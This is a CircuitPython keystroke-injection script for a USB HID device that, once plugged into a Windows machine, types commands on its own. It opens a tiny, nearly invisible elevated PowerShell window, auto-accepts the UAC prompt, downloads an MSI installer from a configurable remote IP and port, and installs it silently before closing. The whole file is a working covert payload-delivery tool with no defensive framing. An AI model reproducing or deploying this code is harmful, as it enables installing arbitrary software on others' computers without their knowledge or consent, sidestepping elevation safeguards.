import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

ip="192.168.1.180" #change this 
port="1337" #change this
installer="vel.msi" #change this

def vel(ip,port,installer):
    time.sleep(1)
    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(1)
    layout.write("wt --size 1,1 --pos 1915,1075 -p 'powershell'")
    kbd.press(Keycode.CONTROL, Keycode.SHIFT, Keycode.ENTER)
    kbd.release_all()
    time.sleep(4)
    kbd.press(Keycode.ALT, Keycode.Y)
    kbd.release_all()                                                                                                                             
    time.sleep(3)

    layout.write("Start-BitsTransfer -Source http://{}:{}/{} -Destination $env:TEMP\\vel.msi".format(ip,port,installer))
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    time.sleep(4.5) #might want to make this longer depending on where you download from

    layout.write('Start-Process msiexec.exe -ArgumentList "/I `"$env:TEMP\\vel.msi`" /quiet /norestart" -Wait')
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    time.sleep(0.3)
    layout.write("exit")
    kbd.press(Keycode.ENTER)
    kbd.release_all()


time.sleep(0.1) 
vel(ip, port,installer)